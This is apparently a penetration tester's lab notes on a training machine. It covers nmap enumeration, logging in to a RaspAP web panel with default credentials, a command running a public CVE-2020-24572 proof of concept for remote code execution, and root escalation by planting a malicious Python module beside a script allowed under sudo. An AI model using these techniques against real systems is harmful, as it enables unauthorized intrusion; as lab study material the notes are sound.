### Enumeration
```
IP=192.168.170.97
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,23,25,53,422,8091,42042 -A $IP
```
### Ports 
- 22
	- OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
- 23
	- Linux telnetd
	- Linux Telnetd 0.17
- 25
	- Postfix smtpd
- 53
	- tcpwrapped
- 422
	- OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
- 8091
	- lighttpd 1.4.53
- 42042
	- OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
### Foothold
- 23
	- expoloit-db 48170
		- Linux Telnetd 0.17
		- RCE fedora
		- leak unsuccessful
- 8091
	- Default landing page
		- ![[Pasted image 20240715133724.png]]
		- Capture with burp. See RaspAP as platform
		- Googled default credentials
			- admin:secret
			- Allows us to login
	- Versions
		- RaspAP v2.5
			- Googled RaspAP v2.5
				- exlpoit-db 50224
				- no work
				- https://github.com/gerbsec/CVE-2020-24572-POC
					- python3 exploit.py 192.168.170.97 8091 192.168.45.195 22 secret 1  -  gets rce
	- Directory Brute force
		- dirsearch -u http://$IP
			- /composer.json
				- billz/raspap-webgui
				- php 7
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
			- /app
				- 403 forbidden
			- /config
				- 403 forbidden
			- /ajx
			- /templates
			- /dist
			- /installers
			- /locale
		- Found directories
### PE
#### Linux
- www-data
	- id
		- uid=33(www-data) gid=33(www-data) groups=33(www-data)
	- sudo -l
		- (ALL) NOPASSWD: /sbin/ifup
		- (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
			- only read permissions
			- nothing interesting
			- sudo /usr/bin/python /home/walter/wifi_reset.py
				- Unable to load wificontroller module.
				- maybe inject malicious module
				- ![[Pasted image 20240715145554.png]]
				- Move it to same directory as python file
				- sudo /usr/bin/python /home/walter/wifi_reset.py
				- We get RCE as root
		- (ALL) NOPASSWD: /bin/systemctl start hostapd.service
		- (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
		- (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
		- (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
		- (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
	- uname -a
		- Linux walla 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
	- getcap -r / 2>/dev/null
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
	- Users with console
		- drwxr-xr-x  2 www-data www-data 4096 Sep 17  2020 walter
		- terry
		- paige
		- janis
	- linpeas
		- write privileges over /lib/systemd/system/raspapd.service
### Credentials
### Lessons Learned